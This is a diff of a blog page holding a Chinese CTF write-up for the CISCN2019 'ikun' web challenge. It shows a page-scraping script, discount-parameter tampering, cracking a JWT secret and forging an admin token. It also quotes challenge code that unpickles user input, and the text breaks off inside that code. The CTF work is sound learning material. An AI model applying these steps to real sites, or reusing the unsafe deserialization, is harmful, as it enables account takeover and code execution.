@@ -1,500 +1,219 @@
-<!DOCTYPE HTML>
-<html lang="zh-CN">
-
-
-<head>
+<!DOCTYPE html>
+<html>
+  <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="[CISCN2019 华北赛区 Day1 Web2]ikun, L">
-    <meta name="description" content="打开环境，喜闻乐见先注册一个账号然后找一找信息要找到lv6往下翻了几页，好想挺多页的样子，手工找不出来，写个脚本吧
-import requests
-url = &#34;http://63d2c3fa-95be-449a-afe2-1e07c97c">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <meta name="renderer" content="webkit|ie-stand|ie-comp">
-    <meta name="mobile-web-app-capable" content="yes">
-    <meta name="format-detection" content="telephone=no">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <link rel="alternate" href="/LawlietLW.github.io/atom.xml" title="L" type="application/atom+xml" />
+    
+    
+    
+    <link rel="stylesheet" type="text/css" href="/LawlietLW.github.io/css/normalize.css">
+    <link rel="stylesheet" type="text/css" href="/LawlietLW.github.io/css/index.css">
+    
+    <link rel="stylesheet" type="text/css" href="/LawlietLW.github.io/css/sidebar.css">
+    
+    
+<link rel="stylesheet" type="text/css" href="/LawlietLW.github.io/css/page.css">
+<link rel="stylesheet" type="text/css" href="/LawlietLW.github.io/css/post.css">
+
+    <link rel="stylesheet" type="text/css" href="/LawlietLW.github.io/css/custom.css">
+    <link rel="stylesheet" type="text/css" href="/LawlietLW.github.io/css/%5Bobject%20Object%5D.css">
+    <link rel="stylesheet" type="text/css" href="/LawlietLW.github.io/css/lightgallery.min.css">
+    <script type="text/javascript" src="/LawlietLW.github.io/js/jquery.min.js"></script>
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/util.js"></script>
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/clipboard.min.js"></script>
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/scrollspy.js"></script>
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/fontawesome-all.min.js"></script>
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/lightgallery.min.js"></script>
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/lg-fullscreen.min.js"></script>
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/lg-hash.min.js"></script>
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/lg-pager.min.js"></script>
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/lg-thumbnail.min.js"></script>
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/lg-zoom.min.js"></script>
+    
+    
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/search.js"></script>
+    <script type="text/javascript">
+    $(document).ready(function () {
+      var searchPath = "search.xml";
+      if (searchPath.length === 0) {
+        searchPath = "search.xml";
+      }
+      var path = "/LawlietLW.github.io/" + searchPath;
+      searchFunc(path, "search-input", "search-result");
+    });
+    </script>
+    
+    
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/index.js"></script>
+    <script type="text/javascript">
+    $(document).ready(function () {
+      var cb = null;
+      var els = $(".post figure.highlight");
+      if (els.length) {
+        // Enabled Hexo highlight line number.
+        $(els).each(function (i, e) {
+          // $(e).before("<button class=\"copy button\">Copy</button>");
+          $(e).before([
+            "<div class=\"code-titlebar\">",
+              "<div class=\"titlebar-left\">",
+                "<button class=\"copy\" aria-label=\"Copy\"><i class=\"far fa-copy\"></i></button>",
+              "</div>",
+              "<div class=\"titlebar-center\">",
+                "code",
+              "</div>",
+              "<div class=\"titlebar-right\">",
+                "<button class=\"button-dot dot-minimize\" aria-label=\"Decoration\"></button>",
+                "<button class=\"button-dot dot-maximize\" aria-label=\"Decoration\"></button>",
+                "<button class=\"button-dot dot-close\" aria-label=\"Decoration\"></button>",
+              "</div>",
+            "</div>"
+          ].join(""));
+        });
+        cb = new ClipboardJS("button.copy", {
+          "target": function (trigger) {
+              // Get target element by DOM API.
+              return trigger.parentNode.parentNode.nextElementSibling.firstChild.firstChild.firstChild.lastChild.firstChild.firstChild;
+          }
+        });
+      } else {
+        // Disabled Hexo highlight line number.
+        els = $(".post pre code");
+        $(els).each(function (i, e) {
+          // Add button before pre, not code.
+          // $(e).parent().before("<button class=\"copy button\">Copy</button>");
+          $(e).before([
+            "<div class=\"code-titlebar\">",
+              "<div class=\"titlebar-left\">",
+                "<button class=\"copy\" aria-label=\"Copy\"><i class=\"far fa-copy\"></i></button>",
+              "</div>",
+              "<div class=\"titlebar-center\">",
+                "code",
+              "</div>",
+              "<div class=\"titlebar-right\">",
+                "<button class=\"button-dot dot-minimize\" aria-label=\"Decoration\"></button>",
+                "<button class=\"button-dot dot-maximize\" aria-label=\"Decoration\"></button>",
+                "<button class=\"button-dot dot-close\" aria-label=\"Decoration\"></button>",
+              "</div>",
+            "</div>"
+          ].join(""));
+        });
+        cb = new ClipboardJS("button.copy", {
+          "target": function (trigger) {
+              // Get target element by DOM API.
+              return trigger.parentNode.parentNode.nextElementSibling;
+          }
+        });
+      }
+      cb.on("success", function (e) {
+        e.clearSelection();
+        var trigger = e.trigger;
+        // Change button text as a user tip.
+        trigger.innerHTML = "<i class=\"far fa-check-square\"></i>";
+        $(trigger).addClass("copied");
+        // Change button text back;
+        setTimeout(function () {
+          trigger.innerHTML = "<i class=\"far fa-copy\"></i>";
+          $(trigger).removeClass("copied");
+        }, 1500);
+      });
+    });
+    </script>
+    
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/custom.js"></script>
     <title>[CISCN2019 华北赛区 Day1 Web2]ikun | L</title>
-    <link rel="icon" type="image/png" href="/favicon.png">
-
-    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
-    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
-    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
-    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
-    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
-    <link rel="stylesheet" type="text/css" href="/css/matery.css">
-    <link rel="stylesheet" type="text/css" href="/css/my.css">
+  <meta name="generator" content="Hexo 4.1.1"><link rel="stylesheet" href="/LawlietLW.github.io/css/prism-tomorrow.css" type="text/css"></head>
+  <body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN"  data-spy="scroll" data-target=".list-group">
     
-    <script src="/libs/jquery/jquery.min.js"></script>
-    
-<meta name="generator" content="Hexo 4.1.1"><link rel="alternate" href="/LawlietLW.github.io/atom.xml" title="L" type="application/atom+xml">
-<link rel="stylesheet" href="/LawlietLW.github.io/css/prism-tomorrow.css" type="text/css"></head>
-
-
-<body>
-    <header class="navbar-fixed">
-    <nav id="headNav" class="bg-color nav-transparent">
-        <div id="navContainer" class="nav-wrapper head-container">
-            <div class="brand-logo">
-                <a href="/LawlietLW.github.io/" class="waves-effect waves-light">
-                    
-                    <img src="/medias/1.png" class="logo-img" alt="LOGO">
-                    
-                    <span class="logo-span">L</span>
-                </a>
-            </div>
-            
-
-<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
-<ul class="right nav-menu">
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/" class="waves-effect waves-light">
+<header id="header" class="header">
+  <div class="container">
+    <div class="header-container">
+      <div class="header-title">
+        <h1 class="title"><a href="/LawlietLW.github.io/">L</a></h1>
+        <h2 class="subtitle"></h2>
+      </div>
       
-      <i class="fas fa-home" style="zoom: 0.6;"></i>
-      
-      <span>首页</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/tags" class="waves-effect waves-light">
-      
-      <i class="fas fa-tags" style="zoom: 0.6;"></i>
-      
-      <span>标签</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/categories" class="waves-effect waves-light">
-      
-      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
-      
-      <span>分类</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/archives" class="waves-effect waves-light">
-      
-      <i class="fas fa-archive" style="zoom: 0.6;"></i>
-      
-      <span>归档</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/about" class="waves-effect waves-light">
-      
-      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
-      
-      <span>关于</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/contact" class="waves-effect waves-light">
-      
-      <i class="fas fa-comments" style="zoom: 0.6;"></i>
-      
-      <span>留言板</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/friends" class="waves-effect waves-light">
-      
-      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
-      
-      <span>友情链接</span>
-    </a>
-    
-  </li>
-  
-  <li>
-    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
-      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
-    </a>
-  </li>
-</ul>
-
-<div id="mobile-nav" class="side-nav sidenav">
-
-    <div class="mobile-head bg-color">
-        
-        <img src="/medias/1.png" class="logo-img circle responsive-img">
-        
-        <div class="logo-name">L</div>
-        <div class="logo-desc">
-            
-            Never really desperate, only the lost of the soul.
-            
-        </div>
     </div>
-
-    
-
-    <ul class="menu-list mobile-menu-list">
+    <nav id="nav" class="nav">
+      <a id="nav-toggle" class="nav-toggle" aria-hidden="true"><i class="fas fa-bars" aria-label="Toggle Navbar"></i></a>
+      <ul id="menu" role="menubar" aria-hidden="false">
         
-        <li class="m-nav-item">
-	  
-		<a href="/" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-home"></i>
-			
-			首页
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/tags" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-tags"></i>
-			
-			标签
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/categories" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-bookmark"></i>
-			
-			分类
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/archives" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-archive"></i>
-			
-			归档
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/about" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-user-circle"></i>
-			
-			关于
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/contact" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-comments"></i>
-			
-			留言板
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/friends" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-address-book"></i>
-			
-			友情链接
-		</a>
-          
-        </li>
-        
-        
-    </ul>
-</div>
-
-        </div>
-
-        
+      </ul>
     </nav>
-
+  </div>
 </header>
 
-    
 
-
-
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/bizhi/2.jpg')">
-    <div class="container" style="right: 0px;left: 0px;">
-        <div class="row">
-            <div class="col s12 m12 l12">
-                <div class="brand">
-                    <h1 class="description center-align post-title">[CISCN2019 华北赛区 Day1 Web2]ikun</h1>
-                </div>
-            </div>
-        </div>
+    <main id="main" class="main">
+      <div class="container">
+        <div class="main-container">
+          <div class="content">
+            
+<div id="post" class="page">
+  
+  <article class="article post card" itemscope itemtype="http://schema.org/Article">
+    <div class="post-block">
+      <link itemprop="mainEntityOfPage" href="http://LawlietLW.github.io/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/">
+      <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+       <meta itemprop="name" content="Lock">
+       <meta itemprop="description" content="">
+       <meta itemprop="image" content="/LawlietLW.github.io/">
+      </span>
+      <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+       <meta itemprop="name" content="L">
+      </span>
     </div>
-</div>
-
-
-
-
-<main class="post-container content">
-
-    
-    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
-<style>
-    #articleContent h1::before,
-    #articleContent h2::before,
-    #articleContent h3::before,
-    #articleContent h4::before,
-    #articleContent h5::before,
-    #articleContent h6::before {
-        display: block;
-        content: " ";
-        height: 100px;
-        margin-top: -100px;
-        visibility: hidden;
-    }
-
-    #articleContent :focus {
-        outline: none;
-    }
-
-    .toc-fixed {
-        position: fixed;
-        top: 64px;
-    }
-
-    .toc-widget {
-        width: 345px;
-        padding-left: 20px;
-    }
-
-    .toc-widget .toc-title {
-        margin: 35px 0 15px 0;
-        padding-left: 17px;
-        font-size: 1.5rem;
-        font-weight: bold;
-        line-height: 1.5rem;
-    }
-
-    .toc-widget ol {
-        padding: 0;
-        list-style: none;
-    }
-
-    #toc-content {
-        height: calc(100vh - 250px);
-        overflow: auto;
-    }
-
-    #toc-content ol {
-        padding-left: 10px;
-    }
-
-    #toc-content ol li {
-        padding-left: 10px;
-    }
-
-    #toc-content .toc-link:hover {
-        color: #42b983;
-        font-weight: 700;
-        text-decoration: underline;
-    }
-
-    #toc-content .toc-link::before {
-        background-color: transparent;
-        max-height: 25px;
-    }
-
-    #toc-content .is-active-link {
-        color: #42b983;
-    }
-
-    #toc-content .is-active-link::before {
-        background-color: #42b983;
-    }
-
-    #floating-toc-btn {
-        position: fixed;
-        right: 15px;
-        bottom: 76px;
-        padding-top: 15px;
-        margin-bottom: 0;
-        z-index: 998;
-    }
-
-    #floating-toc-btn .btn-floating {
-        width: 48px;
-        height: 48px;
-    }
-
-    #floating-toc-btn .btn-floating i {
-        line-height: 48px;
-        font-size: 1.4rem;
-    }
-</style>
-<div class="row">
-    <div id="main-content" class="col s12 m12 l9">
-        <!-- 文章内容详情 -->
-<div id="artDetail">
-    <div class="card">
-        <div class="card-content article-info">
-            <div class="row tag-cate">
-                <div class="col s7">
-                    
-                    <div class="article-tag">
-                        
-                            <a href="/LawlietLW.github.io/tags/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
-                                <span class="chip bg-color">python反序列化</span>
-                            </a>
-                        
-                            <a href="/LawlietLW.github.io/tags/pickle%EF%BC%8CWeb/">
-                                <span class="chip bg-color">pickle，Web</span>
-                            </a>
-                        
-                    </div>
-                    
-                </div>
-                <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/LawlietLW.github.io/categories/CTF/" class="post-category">
-                                CTF
-                            </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
-
-            <div class="post-info">
-                
-                <div class="post-date info-break-policy">
-                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-02-10
-                </div>
-                
-
-                
-                <div class="post-date info-break-policy">
-                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-02-14
-                </div>
-                
-
-                
-                <div class="info-break-policy">
-                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.3k
-                </div>
-                
-
-                
-                <div class="info-break-policy">
-                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    5 分
-                </div>
-                
-
-                
-                    <div id="busuanzi_container_page_pv" class="info-break-policy">
-                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
-                        <span id="busuanzi_value_page_pv"></span>
-                    </div>
-				
-            </div>
-
-        </div>
-        <hr class="clearfix">
-        <div class="card-content article-card-content">
-            <div id="articleContent">
-                <p>打开环境，喜闻乐见<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/1.jpg" alt=""><br>先注册一个账号<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/3.jpg" alt=""><br>然后找一找信息<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/2.jpg" alt=""><br>要找到lv6<br>往下翻了几页，好想挺多页的样子，手工找不出来，写个脚本吧</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
-url <span class="token operator">=</span> <span class="token string">"http://63d2c3fa-95be-449a-afe2-1e07c97c0013.node3.buuoj.cn/shop?page=%d"</span>
-<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    u <span class="token operator">=</span> url <span class="token operator">%</span> i
-    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"正在测试第%d页"</span><span class="token operator">%</span>i<span class="token punctuation">)</span>
-    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>u<span class="token punctuation">)</span>
-    <span class="token keyword">if</span> <span class="token string">'lv6.png'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
-        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"lv6在第%d页"</span><span class="token operator">%</span>i<span class="token punctuation">)</span>
-        <span class="token keyword">break</span></code></pre>
+    <header class="post-header">
+      <h1 class="post-title" itemprop="name headline">[CISCN2019 华北赛区 Day1 Web2]ikun</h1>
+      <div class="post-meta">
+        
+        <span class="post-date">
+          <i class="far fa-calendar-plus"></i><span><time title="post-date" itemprop="dateCreated datePublished" datetime="2020-02-10T13:14:44+08:00">2020-02-10 13:14:44</time></span>
+        </span>
+        
+        
+        
+        <span class="post-meta-divider divider">|</span>
+        
+        <span class="post-categories">
+          
+          <i class="far fa-folder-open"></i><span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/LawlietLW.github.io/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+        </span>
+        
+        
+      </div>
+    </header>
+    <main class="post-main" itemprop="articleBody">
+      <p>打开环境，喜闻乐见<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/1.jpg" alt=""><br>先注册一个账号<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/3.jpg" alt=""><br>然后找一找信息<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/2.jpg" alt=""><br>要找到lv6<br>往下翻了几页，好想挺多页的样子，手工找不出来，写个脚本吧</p>
+<figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre class=" language-hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">"http://63d2c3fa-95be-449a-afe2-1e07c97c0013.node3.buuoj.cn/shop?page=%d"</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">1000</span>):<br>    u = url % i<br>    print(<span class="hljs-string">"正在测试第%d页"</span>%i)<br>    r = requests.get(u)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">'lv6.png'</span> <span class="hljs-keyword">in</span> r.text:<br>        print(<span class="hljs-string">"lv6在第%d页"</span>%i)<br>        <span class="hljs-keyword"><code class="language-hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">"http://63d2c3fa-95be-449a-afe2-1e07c97c0013.node3.buuoj.cn/shop?page=%d"</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">1000</span>):<br>    u = url % i<br>    print(<span class="hljs-string">"正在测试第%d页"</span>%i)<br>    r = requests.get(u)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">'lv6.png'</span> <span class="hljs-keyword">in</span> r.text:<br>        print(<span class="hljs-string">"lv6在第%d页"</span>%i)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></tbody></table></figure>
 <p><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/4.jpg" alt=""><br>找到lv6在181页<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/5.jpg" alt=""><br>购买<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/6.jpg" alt=""><br>好像买不起的样子<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/7.jpg" alt=""><br>果然买不起<br>那开着burp看看请求<br>注意到有一个discount折扣字样<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/8.jpg" alt=""><br>那把折扣改成0试一下<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/9.jpg" alt=""><br>操作失败<br>那把折扣改为不为0的很小的数字试试<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/10.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/11.jpg" alt=""><br>购买成功到了另一个页面，显示只允许admin访问<br>可能和cookie之类的有关，再次访问抓包<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/12.jpg" alt=""><br>注意到有一个JWT字段</p>
-<pre class=" language-bash"><code class="language-bash">Json web token <span class="token punctuation">(</span>JWT<span class="token punctuation">)</span>, 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（<span class="token punctuation">(</span>RFC 7519<span class="token punctuation">)</span>.该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密</code></pre>
+<figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs bash"><code class="language-hljs bash">Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密<br></code></pre></td></tr></tbody></table></figure>
 <p>一种token，用来认证的</p>
-<pre class=" language-bash"><code class="language-bash">JWT的构成
-第一部分我们称它为头部（header<span class="token punctuation">)</span>,第二部分我们称其为载荷（payload, 类似于飞机上承载的物品<span class="token punctuation">)</span>，第三部分是签证（signature<span class="token punctuation">)</span>.</code></pre>
+<figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs bash"><code class="language-hljs bash">JWT的构成<br>第一部分我们称它为头部（header),第二部分我们称其为载荷（payload, 类似于飞机上承载的物品)，第三部分是签证（signature).<br></code></pre></td></tr></tbody></table></figure>
 <p>整体就差不多是这样<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/13.jpg" alt=""><br>不过JWT可以破解，python中的pyjwt模块等，在这里我们用<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">c-jwt-cracker</a>这个工具破解<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/14.jpg" alt=""><br>破解很快，加密密钥就是1Kun<br>然后我们到这个网站去进行在线加密<a href="https://jwt.io/" target="_blank" rel="noopener"></a><br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/15.jpg" alt=""><br>把密钥替换为1Kun，用户名替换为admin，将新的JWT替换到我们的请求信息当中<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/16.jpg" alt=""><br>成功以admin身份登录<br>查看页面源代码<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/17.jpg" alt=""><br>发现了一个压缩文件，下载来看看<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/18.jpg" alt=""><br>是这个网站的源代码<br>又到了头疼的代码审计环节。。。<br>挨个挨个看吧</p>
 <hr>
 <p>好吧实在审不来，看wp吧<br>有一个python反序列化漏洞，在Admin.py </p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> tornado<span class="token punctuation">.</span>web
-<span class="token keyword">from</span> sshop<span class="token punctuation">.</span>base <span class="token keyword">import</span> BaseHandler
-<span class="token keyword">import</span> pickle
-<span class="token keyword">import</span> urllib
-
-<span class="token keyword">class</span> <span class="token class-name">AdminHandler</span><span class="token punctuation">(</span>BaseHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    @tornado<span class="token punctuation">.</span>web<span class="token punctuation">.</span>authenticated
-    <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">if</span> self<span class="token punctuation">.</span>current_user <span class="token operator">==</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>
-            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span><span class="token string">'This is Black Technology!'</span><span class="token punctuation">,</span> member<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
-        <span class="token keyword">else</span><span class="token punctuation">:</span>
-            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'no_ass.html'</span><span class="token punctuation">)</span>
-
-    @tornado<span class="token punctuation">.</span>web<span class="token punctuation">.</span>authenticated
-    <span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">try</span><span class="token punctuation">:</span>
-            become <span class="token operator">=</span> self<span class="token punctuation">.</span>get_argument<span class="token punctuation">(</span><span class="token string">'become'</span><span class="token punctuation">)</span>
-            p <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>become<span class="token punctuation">)</span><span class="token punctuation">)</span>
-            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span>p<span class="token punctuation">,</span> member<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
-        <span class="token keyword">except</span><span class="token punctuation">:</span>
-            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span><span class="token string">'This is Black Technology!'</span><span class="token punctuation">,</span> member<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre>
+<figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre class=" language-hljs python"><span class="hljs-keyword">import</span> tornado.web<br><span class="hljs-keyword">from</span> sshop.base <span class="hljs-keyword">import</span> BaseHandler<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AdminHandler</span><span class="hljs-params">(BaseHandler)</span>:</span><br><span class="hljs-meta">    @tornado.web.authenticated</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span><span class="hljs-params">(self, *args, **kwargs)</span>:</span><br>        <span class="hljs-keyword">if</span> self.current_user == <span class="hljs-string">"admin"</span>:<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">'form.html'</span>, res=<span class="hljs-string">'This is Black Technology!'</span>, member=<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">'no_ass.html'</span>)<br><br><span class="hljs-meta">    @tornado.web.authenticated</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">post</span><span 